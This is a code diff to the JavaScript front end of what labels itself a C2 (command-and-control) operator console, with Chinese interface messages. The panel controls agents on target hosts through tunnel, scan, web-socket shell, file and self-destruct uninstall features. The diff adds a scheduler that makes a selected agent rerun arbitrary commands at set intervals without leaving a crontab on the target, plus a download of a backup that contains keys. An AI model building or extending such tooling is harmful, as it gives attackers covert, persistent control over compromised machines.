@@ -246,6 +246,7 @@ function switchTab(name) {
   if (name === "report")    loadReport();
   if (name === "mcp")       loadMcpGuide();
   if (name === "wsshell")   _wsshellOnTabActive();
+  if (name === "schedule")  onScheduleTab();
   if (name === "files" && S.selectedAgent) loadFileCache(
     document.getElementById("files-path").value || "/"
   );
@@ -257,7 +258,7 @@ function switchTab(name) {
 function _updateAgentIndicators() {
   const a = S.selectedAgent;
   const label = a ? `🎯 ${a.hostname || 'unknown'} (${a.privilege || 'user'})` : "";
-  ["tunnel-agent-indicator", "scan-agent-indicator", "upg-agent-indicator", "wsshell-agent-indicator", "files-agent-indicator"].forEach(id => {
+  ["tunnel-agent-indicator", "scan-agent-indicator", "upg-agent-indicator", "wsshell-agent-indicator", "files-agent-indicator", "sched-agent-indicator"].forEach(id => {
     const el = document.getElementById(id);
     if (el) el.textContent = label || "No agent selected";
   });
@@ -669,6 +670,7 @@ function appendResponseMsg(content, respTo, ts, scroll = true) {
   }
   updateTermStatus();
   if (scroll) scrollTerminal();
+  _maybeUpdateSchedulePanel(content);
 }
 
 function scrollTerminal() {
@@ -4083,4 +4085,119 @@ async function upgUninstall() {
   const d = await r.json();
   if (!r.ok || d.error) { toast("发送失败: " + (d.error || r.status), "error"); return; }
   toast("Uninstall 命令已发送，agent 将自毁", "success");
+}
+
+// ── Agent-internal schedule (no crontab on the target) ───────────────────────
+
+function _maybeUpdateSchedulePanel(content) {
+  if (!content) return;
+  const t = String(content).trim();
+  if (!/^(schedule:|schedule #|schedule cleared|Usage: schedule)/.test(t)) return;
+  const el = document.getElementById("sch-result");
+  if (el) el.textContent = t;
+}
+
+function onScheduleTab() {
+  _updateAgentIndicators();
+  scheduleRefresh();
+}
+
+function schedulePreset(n, unit) {
+  const iv = document.getElementById("sch-interval");
+  const un = document.getElementById("sch-unit");
+  if (iv) iv.value = String(n);
+  if (un) un.value = unit;
+}
+
+function _scheduleIntervalSecs() {
+  const n = parseInt(document.getElementById("sch-interval")?.value, 10);
+  const unit = document.getElementById("sch-unit")?.value || "s";
+  if (!Number.isFinite(n) || n < 1) return 0;
+  if (unit === "m") return n * 60;
+  if (unit === "h") return n * 3600;
+  return n;
+}
+
+async function _scheduleSend(cmd) {
+  if (!S.selectedAgent) { toast("请先选择 agent", "error"); return false; }
+  const r = await fetch("/api/command", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ agent_id: S.selectedAgent.id, command: cmd }),
+  });
+  const d = await r.json().catch(() => ({}));
+  if (!r.ok || d.error) {
+    toast("发送失败: " + (d.error || r.status), "error");
+    return false;
+  }
+  toast("已发送，等 Agent 回显（通常一个轮询周期）", "info");
+  return true;
+}
+
+async function scheduleAdd() {
+  const secs = _scheduleIntervalSecs();
+  const cmd = (document.getElementById("sch-cmd")?.value || "").trim();
+  if (secs < 10 || secs > 604800) {
+    toast("间隔须 10 秒～7 天", "error");
+    return;
+  }
+  if (!cmd) { toast("填写要周期执行的命令", "error"); return; }
+  if (/^schedule(\s|$)/i.test(cmd)) {
+    toast("不要把 schedule 自己再套一层", "error");
+    return;
+  }
+  await _scheduleSend(`schedule add ${secs} ${cmd}`);
+}
+
+async function scheduleRefresh() {
+  const el = document.getElementById("sch-result");
+  if (el && !S.selectedAgent) {
+    el.textContent = "先在左侧选一台 Agent。";
+    return;
+  }
+  await _scheduleSend("schedule ls");
+}
+
+async function scheduleRm() {
+  const id = parseInt(document.getElementById("sch-rm-id")?.value, 10);
+  if (!Number.isFinite(id) || id < 1) {
+    toast("先填要删除的任务 #id", "error");
+    return;
+  }
+  await _scheduleSend(`schedule rm ${id}`);
+}
+
+async function scheduleClear() {
+  if (!confirm("清空这台 Agent 上全部内置定时任务？")) return;
+  await _scheduleSend("schedule clear");
+}
+
+async function downloadConsoleBackup() {
+  const btn = document.getElementById("btn-console-backup");
+  if (btn) btn.disabled = true;
+  try {
+    const r = await fetch("/api/backup");
+    if (!r.ok) {
+      const d = await r.json().catch(() => ({}));
+      toast(d.error || "备份失败", "error");
+      return;
+    }
+    const blob = await r.blob();
+    const cd = r.headers.get("Content-Disposition") || "";
+    const m = /filename\*?=(?:UTF-8'')?"?([^\";]+)"?/i.exec(cd);
+    const name = m ? decodeURIComponent(m[1]) : "c2-backup.zip";
+    const a = document.createElement("a");
+    const url = URL.createObjectURL(blob);
+    a.href = url;
+    a.download = name;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    URL.revokeObjectURL(url);
+    toast("备份已开始下载（含密钥，请妥善保存）", "success");
+  } catch (e) {
+    toast("备份失败: " + e, "error");
+  } finally {
+    if (btn) btn.disabled = false;
+  }
 }
